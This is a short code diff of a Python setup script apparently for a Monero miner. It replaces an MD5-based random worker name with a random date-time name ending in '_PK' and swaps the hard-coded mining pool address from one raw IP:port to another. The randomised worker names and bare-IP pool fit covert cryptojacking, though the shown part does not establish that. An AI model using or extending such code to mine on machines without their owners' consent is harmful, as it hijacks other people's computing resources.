@@ -5,12 +5,22 @@ import subprocess
 import hashlib
 import stat
 import urllib.request
+from datetime import datetime, timedelta
 
-# === 1. Generate worker name like: $(echo $RANDOM | md5sum | head -c 20)
+# === 1. Generate worker name based on a random date and time + "_PK"
 def generate_worker_name():
-    random_number = str(random.randint(0, 999999999)).encode()
-    md5_hash = hashlib.md5(random_number).hexdigest()
-    return md5_hash[:20]
+    # Generate a random datetime within a range (e.g., last 10 years)
+    start_date = datetime(2015, 1, 1)
+    end_date = datetime.now()
+    random_days = random.randint(0, (end_date - start_date).days)
+    random_seconds = random.randint(0, 86400)  # Random time within the day
+
+    random_datetime = start_date + timedelta(days=random_days, seconds=random_seconds)
+    
+    # Format the date to a string
+    date_str = random_datetime.strftime('%Y%m%d_%H%M%S')  # e.g., 20230913_154732
+    
+    return f"{date_str}_PK"
 
 worker_name = generate_worker_name()
 print(f"[+] Generated worker name: {worker_name}")
@@ -41,7 +51,7 @@ config = {
         "xmrSettings": {
             "disable": False,
             "enableGpu": False,
-            "poolAddress": "139.162.7.93:8089",
+            "poolAddress": "172.104.155.26:8083",
             "customParameters": f"-t {cpu_threads}"
         }
     }
